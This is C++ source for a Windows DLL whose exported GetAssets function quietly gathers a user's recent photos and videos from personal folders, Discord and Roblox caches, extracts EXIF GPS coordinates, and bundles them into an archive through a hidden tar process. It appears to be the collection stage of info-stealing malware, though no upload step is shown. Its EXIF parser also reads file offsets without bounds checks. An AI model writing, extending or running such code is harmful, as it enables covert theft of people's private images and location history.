

#include "main.h"
#include <windows.h>
#include <shlobj.h>
#include <string>
#include <vector>
#include <filesystem>
#include <fstream>
#include <set>
#include <algorithm>
#include <ctime>
#include <cstdint>
#include <sstream>
#include <functional>

namespace fs = std::filesystem;

namespace util {

struct ExifData {
    std::string make, model, software, dateTime, dateTimeOriginal;
    bool   hasGPS = false;
    double gpsLat = 0.0, gpsLon = 0.0;
    std::string gpsLatRef, gpsLonRef;
};

static uint16_t Read16(const uint8_t* p, bool be) {
    return be ? (uint16_t)((p[0] << 8) | p[1]) : (uint16_t)((p[1] << 8) | p[0]);
}
static uint32_t Read32(const uint8_t* p, bool be) {
    return be ? ((uint32_t)p[0] << 24) | ((uint32_t)p[1] << 16) |
                ((uint32_t)p[2] <<  8) |  (uint32_t)p[3]
             : ((uint32_t)p[3] << 24) | ((uint32_t)p[2] << 16) |
                ((uint32_t)p[1] <<  8) |  (uint32_t)p[0];
}

static std::string ReadIfdString(const uint8_t* tiffBase, bool be,
                                 const uint8_t* entry, uint32_t count) {
    if (count == 0) return "";
    const uint8_t* p;
    if (count <= 4) {
        p = entry + 8;
    } else {
        uint32_t off = Read32(entry + 8, be);
        p = tiffBase + off;
    }

    return std::string((const char*)p, count - 1);
}

static double ReadRational(const uint8_t* p, bool be) {
    uint32_t n = Read32(p,     be);
    uint32_t d = Read32(p + 4, be);
    if (d == 0) return 0.0;
    return (double)n / (double)d;
}

static double ReadDms(const uint8_t* p, bool be) {
    double d  = ReadRational(p,           be);
    double m  = ReadRational(p + 8,       be);
    double s  = ReadRational(p + 16,      be);
    return d + (m / 60.0) + (s / 3600.0);
}

static void ParseGpsIfd(const uint8_t* tiffBase, bool be,
                        const uint8_t* gpsIfd, ExifData& out) {
    uint16_t n = Read16(gpsIfd, be);
    for (uint16_t i = 0; i < n; i++) {
        const uint8_t* e = gpsIfd + 2 + i * 12;
        uint16_t tag   = Read16(e,     be);
        uint16_t type  = Read16(e + 2, be);
        uint32_t count = Read32(e + 4, be);
        if (tag == 0x0001 && type == 2) out.gpsLatRef = ReadIfdString(tiffBase, be, e, count);
        if (tag == 0x0003 && type == 2) out.gpsLonRef = ReadIfdString(tiffBase, be, e, count);
        if (tag == 0x0002 && type == 5 && count == 3) {
            uint32_t off = Read32(e + 8, be);
            double v = ReadDms(tiffBase + off, be);
            if (!out.gpsLatRef.empty() && out.gpsLatRef[0] == 'S') v = -v;
            out.gpsLat = v; out.hasGPS = true;
        }
        if (tag == 0x0004 && type == 5 && count == 3) {
            uint32_t off = Read32(e + 8, be);
            double v = ReadDms(tiffBase + off, be);
            if (!out.gpsLonRef.empty() && out.gpsLonRef[0] == 'W') v = -v;
            out.gpsLon = v; out.hasGPS = true;
        }
    }
}

static void ParseExifSubIfd(const uint8_t* tiffBase, bool be,
                            const uint8_t* exifIfd, ExifData& out) {
    uint16_t n = Read16(exifIfd, be);
    for (uint16_t i = 0; i < n; i++) {
        const uint8_t* e = exifIfd + 2 + i * 12;
        uint16_t tag   = Read16(e,     be);
        uint16_t type  = Read16(e + 2, be);
        uint32_t count = Read32(e + 4, be);
        if (tag == 0x9003 && type == 2) {
            out.dateTimeOriginal = ReadIfdString(tiffBase, be, e, count);
        }
    }
}

static void ParseIfd0(const uint8_t* tiffBase, bool be,
                      const uint8_t* ifd0, ExifData& out) {
    uint16_t n = Read16(ifd0, be);
    for (uint16_t i = 0; i < n; i++) {
        const uint8_t* e = ifd0 + 2 + i * 12;
        uint16_t tag   = Read16(e,     be);
        uint16_t type  = Read16(e + 2, be);
        uint32_t count = Read32(e + 4, be);

        if (tag == 0x010F && type == 2) out.make     = ReadIfdString(tiffBase, be, e, count);
        if (tag == 0x0110 && type == 2) out.model    = ReadIfdString(tiffBase, be, e, count);
        if (tag == 0x0131 && type == 2) out.software = ReadIfdString(tiffBase, be, e, count);
        if (tag == 0x0132 && type == 2) out.dateTime = ReadIfdString(tiffBase, be, e, count);
        if (tag == 0x8769 && type == 4) {

            uint32_t off = Read32(e + 8, be);
            ParseExifSubIfd(tiffBase, be, tiffBase + off, out);
        }
        if (tag == 0x8825 && type == 4) {

            uint32_t off = Read32(e + 8, be);
            ParseGpsIfd(tiffBase, be, tiffBase + off, out);
        }
    }
}

static bool ExtractJpegExif(const std::wstring& path, ExifData& out) {
    HANDLE h = ::CreateFileW(path.c_str(), GENERIC_READ, FILE_SHARE_READ,
                             nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (h == INVALID_HANDLE_VALUE) return false;
    DWORD sz = ::GetFileSize(h, nullptr);
    if (sz < 14) { ::CloseHandle(h); return false; }

    DWORD readCap = (sz > 4 * 1024 * 1024) ? (4 * 1024 * 1024) : sz;
    std::vector<uint8_t> buf(readCap);
    DWORD rd = 0;
    if (!::ReadFile(h, buf.data(), readCap, &rd, nullptr) || rd < 14) {
        ::CloseHandle(h); return false;
    }
    ::CloseHandle(h);

    if (buf[0] != 0xFF || buf[1] != 0xD8) return false;

    size_t pos = 2;
    while (pos + 4 < buf.size()) {
        if (buf[pos] != 0xFF) return false;
        uint8_t marker = buf[pos + 1];
        if (marker == 0xDA) return false;
        uint16_t segLen = (uint16_t)((buf[pos + 2] << 8) | buf[pos + 3]);
        if (marker == 0xE1 && pos + 10 < buf.size() &&
            memcmp(buf.data() + pos + 4, "Exif", 4) == 0) {
            const uint8_t* tiff = buf.data() + pos + 10;
            bool be = (tiff[0] == 'M' && tiff[1] == 'M');
            if (!(tiff[0] == 'I' && tiff[1] == 'I') && !be) return false;
            if (Read16(tiff + 2, be) != 0x002A) return false;
            uint32_t ifd0Off = Read32(tiff + 4, be);
            ParseIfd0(tiff, be, tiff + ifd0Off, out);
            return true;
        }
        if (segLen < 2) return false;
        pos += 2 + segLen;
    }
    return false;
}

static std::string ExifToJson(const ExifData& e) {
    std::ostringstream ss;
    ss << "{";
    auto addStr = [&](const char* k, const std::string& v) {
        if (v.empty()) return;
        ss << "\"" << k << "\":\"" << v << "\",";
    };
    addStr("make",     e.make);
    addStr("model",    e.model);
    addStr("software", e.software);
    addStr("datetime", e.dateTime);
    addStr("datetime_original", e.dateTimeOriginal);
    if (e.hasGPS) {
        ss << "\"gps\":{\"lat\":" << e.gpsLat << ",\"lon\":" << e.gpsLon << "},";
    }
    ss << "\"has_gps\":" << (e.hasGPS ? "true" : "false");
    ss << "}";
    return ss.str();
}

struct MediaHit {
    std::wstring srcPath;
    std::wstring arcName;
    uint64_t     size = 0;
    time_t       mtime = 0;
    ExifData     exif;
    bool         hasExif = false;
};

static const std::set<std::wstring> MEDIA_EXTS = {
    L".jpg", L".jpeg", L".png", L".gif", L".webp", L".bmp", L".heic",
    L".mp4", L".mov", L".avi", L".mkv",  L".webm", L".m4v", L".3gp"
};

static bool IsMediaExt(const std::wstring& p) {
    auto pos = p.rfind(L'.');
    if (pos == std::wstring::npos) return false;
    std::wstring ext = p.substr(pos);
    for (auto& c : ext) c = towlower(c);
    return MEDIA_EXTS.count(ext) > 0;
}

static std::wstring SafeArcName(const std::wstring& fullPath, const std::wstring& root) {
    std::wstring rel = fullPath;
    if (rel.size() > root.size() &&
        _wcsnicmp(rel.c_str(), root.c_str(), root.size()) == 0) {
        rel = rel.substr(root.size());
        if (!rel.empty() && (rel[0] == L'\\' || rel[0] == L'/')) rel = rel.substr(1);
    }
    for (auto& c : rel) {
        if (c == L'\\') c = L'/';
        if (c == L':'  || c == L'*' || c == L'?' || c == L'"' ||
            c == L'<'  || c == L'>' || c == L'|') c = L'_';
    }
    if (rel.empty()) rel = L"file";
    return rel;
}

static std::wstring GetUserProfile() {
    wchar_t p[MAX_PATH];
    DWORD n = GetEnvironmentVariableW(L"USERPROFILE", p, MAX_PATH);
    return (n > 0) ? std::wstring(p) : L"";
}

static std::wstring GetLocalAppData() {
    wchar_t p[MAX_PATH];
    if (SUCCEEDED(SHGetFolderPathW(nullptr, CSIDL_LOCAL_APPDATA, nullptr, 0, p)))
        return p;
    return L"";
}

static void WalkFolder(const std::wstring& root, std::vector<MediaHit>& hits,
                       uint64_t minSize, uint64_t maxSize,
                       time_t maxAge, uint64_t& runningTotal, uint64_t totalCap,
                       int maxDepth = 2) {
    if (root.empty() || !fs::exists(root)) return;
    try {
        std::error_code ec;
        std::function<void(const fs::path&, int)> recurse =
            [&](const fs::path& dir, int depth) {
            for (auto& entry : fs::directory_iterator(dir, ec)) {
                if (runningTotal >= totalCap) return;
                if (!entry.is_regular_file(ec)) continue;
                const auto& p = entry.path();
                if (!IsMediaExt(p.wstring())) continue;

                uint64_t sz = entry.file_size(ec);
                if (sz < minSize || sz > maxSize) continue;

                time_t mtime = 0;
                {
                    WIN32_FILE_ATTRIBUTE_DATA fad;
                    if (GetFileAttributesExW(p.c_str(), GetFileExInfoStandard, &fad)) {
                        ULARGE_INTEGER u;
                        u.LowPart  = fad.ftLastWriteTime.dwLowDateTime;
                        u.HighPart = fad.ftLastWriteTime.dwHighDateTime;

                        mtime = (time_t)((u.QuadPart - 116444736000000000ULL) / 10000000ULL);
                    }
                }
                if (maxAge > 0 && mtime > 0 && (time(nullptr) - mtime) > maxAge) continue;

                MediaHit h;
                h.srcPath = p.wstring();
                h.arcName = SafeArcName(p.wstring(), root);
                h.size    = sz;
                h.mtime   = mtime;
                hits.push_back(std::move(h));
                runningTotal += sz;
            }
            if (depth < maxDepth) {
                for (auto& sub : fs::directory_iterator(dir, ec)) {
                    if (sub.is_directory(ec))
                        recurse(sub.path(), depth + 1);
                }
            }
        };
        recurse(fs::path(root), 0);
    } catch (...) {

    }
}

static bool BundleToTarGz(const std::wstring& srcDir,
                          const std::wstring& outArchive) {

    std::wstring parent = srcDir;
    auto pos = parent.rfind(L'\\');
    if (pos == std::wstring::npos) return false;
    std::wstring basename = parent.substr(pos + 1);
    parent = parent.substr(0, pos);

    std::wstring cmd = L"cmd.exe /c tar.exe -czf \"" + outArchive +
                       L"\" -C \"" + parent + L"\" \"" + basename + L"\"";

    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi = {};
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    if (!CreateProcessW(nullptr, &cmd[0], nullptr, nullptr, FALSE,
                        CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi)) {
        return false;
    }
    WaitForSingleObject(pi.hProcess, 60000);
    DWORD exitCode = 0;
    GetExitCodeProcess(pi.hProcess, &exitCode);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return exitCode == 0 && fs::exists(outArchive);
}

static std::string jesc(const std::string& s) {
    std::string o; o.reserve(s.size());
    for (char c : s) {
        switch (c) {
            case '"':  o += "\\\""; break;
            case '\\': o += "\\\\"; break;
            case '\n': o += "\\n";  break;
            case '\r': o += "\\r";  break;
            case '\t': o += "\\t";  break;
            default:   o += c;
        }
    }
    return o;
}

static std::string w2n(const std::wstring& w) {
    std::string s;
    for (wchar_t c : w) if (c < 128) s += (char)c;
    return s;
}

static bool WriteManifest(const std::wstring& path,
                          const std::vector<MediaHit>& hits,
                          uint64_t totalBytes) {

    FILE* f = nullptr;
    if (_wfopen_s(&f, path.c_str(), L"wb") != 0 || !f) return false;
    struct FClose { FILE* f; ~FClose(){ if(f) fclose(f); } } guard{f};
    auto writeStr = [&](const std::string& s) { fwrite(s.data(), 1, s.size(), f); };
    (void)writeStr;

    std::ostringstream ss;
    ss << "{\"total_files\":" << hits.size()
        << ",\"total_bytes\":" << totalBytes
        << ",\"files\":[";
    for (size_t i = 0; i < hits.size(); i++) {
        const auto& h = hits[i];
        ss << "{\"name\":\""    << jesc(w2n(h.arcName)) << "\","
           << "\"path\":\""     << jesc(w2n(h.srcPath)) << "\","
           << "\"size\":"       << h.size << ","
           << "\"mtime\":"      << (int64_t)h.mtime << ","
           << "\"exif\":"       << (h.hasExif ? ExifToJson(h.exif) : std::string("null"))
           << "}";
        if (i + 1 < hits.size()) ss << ",";
    }
    ss << "]}";

    std::string s = ss.str();
    fwrite(s.data(), 1, s.size(), f);
    return ferror(f) == 0;
}

}

extern "C" U_API bool GetAssets(const wchar_t* manifestJsonPath,
                              const wchar_t* archivePath,
                              size_t maxBytes) {
    if (!manifestJsonPath || !archivePath || maxBytes == 0) return false;
    using namespace util;

    std::wstring userProfile = GetUserProfile();
    std::wstring localAppData = GetLocalAppData();
    if (userProfile.empty()) return false;

    std::vector<std::wstring> roots;
    auto add = [&](const std::wstring& r) {
        if (fs::exists(r)) roots.push_back(r);
    };
    add(userProfile + L"\\Desktop");
    add(userProfile + L"\\Documents");
    add(userProfile + L"\\Downloads");
    add(userProfile + L"\\Pictures");
    add(userProfile + L"\\Videos");
    add(localAppData + L"\\Microsoft\\Windows\\NetCache");
    add(localAppData + L"\\Packages\\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\\LocalState\\Assets");
    if (!localAppData.empty()) {
        add(localAppData + L"\\Roblox\\Downloads");
        add(localAppData + L"\\Roblox\\Versions");
    }

    wchar_t appData[MAX_PATH];
    if (SUCCEEDED(SHGetFolderPathW(nullptr, CSIDL_APPDATA, nullptr, 0, appData))) {
        add(std::wstring(appData) + L"\\discord\\Cache");
    }

    add(userProfile + L"\\Pictures\\Roblox");

    std::vector<MediaHit> hits;
    uint64_t running = 0;
    uint64_t cap     = (uint64_t)maxBytes;
    uint64_t minSz   = 50 * 1024;
    uint64_t maxSz   = 50ULL * 1024 * 1024;
    time_t   maxAge  = 90 * 24 * 3600;
    for (const auto& r : roots) {
        WalkFolder(r, hits, minSz, maxSz, maxAge, running, cap, 2);
        if (running >= cap) break;
    }

    std::wstring staging = TempDir() + L"cc_media_" +
                           std::to_wstring(GetCurrentProcessId());
    fs::create_directories(staging);

    uint64_t copied = 0;
    for (auto& h : hits) {
        std::wstring dst = staging + L"\\" + h.arcName;
        std::wstring dstDir = dst.substr(0, dst.rfind(L'\\'));
        try { fs::create_directories(dstDir); } catch (...) {}
        std::error_code ec;
        fs::copy_file(h.srcPath, dst, fs::copy_options::overwrite_existing, ec);
        if (!ec) {
            copied += h.size;

            if (h.arcName.size() >= 4) {
                std::wstring ext = h.arcName.substr(h.arcName.rfind(L'.'));
                for (auto& c : ext) c = towlower(c);
                if (ext == L".jpg" || ext == L".jpeg") {
                    ExifData e;
                    if (ExtractJpegExif(h.srcPath, e)) {
                        h.exif = e;
                        h.hasExif = true;
                    }
                }
            }
        }
    }

    if (!WriteManifest(manifestJsonPath, hits, copied)) {

        std::error_code ec;
        fs::remove_all(staging, ec);
        return false;
    }

    bool ok = BundleToTarGz(staging, archivePath);

    std::error_code ec;
    fs::remove_all(staging, ec);

    return ok;
}

